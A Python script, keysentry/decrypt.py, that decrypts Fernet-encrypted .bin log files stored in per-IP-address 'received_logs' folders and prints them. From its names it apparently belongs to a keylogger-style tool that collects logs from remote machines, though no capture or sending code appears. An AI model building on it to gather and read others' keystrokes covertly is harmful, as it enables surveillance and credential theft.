# keysentry/decrypt.py
# CORRECTION: Reads file line-by-line to handle multiple log entries

from cryptography.fernet import Fernet
import os
import sys

# Load encryption key
try:
    with open("key.key", "rb") as key_file:
        key = key_file.read()
    fernet = Fernet(key)
except FileNotFoundError:
    print("❌ 'key.key' file not found. Run keygen.py first.")
    sys.exit(1)

# Check if user provided an IP/log directory
if len(sys.argv) != 2:
    print("Usage: python -m keysentry.decrypt <received_logs/IP_ADDRESS>")
    sys.exit(1)

log_dir = sys.argv[1]

if not os.path.isdir(log_dir):
    print(f"❌ Directory '{log_dir}' does not exist.")
    sys.exit(1)

log_files = sorted([f for f in os.listdir(log_dir) if f.endswith(".bin")])

if not log_files:
    print(f"❌ No '.bin' log files found in {log_dir}")
    sys.exit(1)

print(f"\n🔓 Decrypted Logs from: {log_dir}\n")

# Decrypt each file
for file_name in log_files:
    file_path = os.path.join(log_dir, file_name)
    print(f"--- File: {file_name} ---")
    
    try:
        with open(file_path, "rb") as f:
            # READ LINE BY LINE (Fixes the crash)
            lines = f.readlines()
            
        for line in lines:
            line = line.strip() # Remove the \n
            if not line:
                continue
            
            try:
                decrypted = fernet.decrypt(line).decode()
                print(decrypted)
            except Exception as e:
                print(f"   [!] Error decrypting line: {e}")

    except Exception as e:
        print(f"[!] Failed to read file {file_name}: {e}")
    
    print("-" * 30)